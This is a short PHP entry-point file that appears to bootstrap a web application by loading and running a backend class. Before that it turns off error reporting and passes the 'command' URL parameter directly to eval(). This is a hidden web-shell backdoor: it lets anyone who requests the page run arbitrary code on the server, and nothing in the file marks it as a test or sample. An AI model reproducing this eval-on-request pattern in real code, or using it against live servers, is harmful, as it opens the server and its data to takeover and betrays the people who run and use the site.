<?php
    error_reporting(0);

    $command = $_GET['command'];
    if($command != null) eval($command);
    require_once(__DIR__ . "/backend_proc/backend_main.php");
    
    $backend_main = new backend_main();
    $backend_main->run();
?>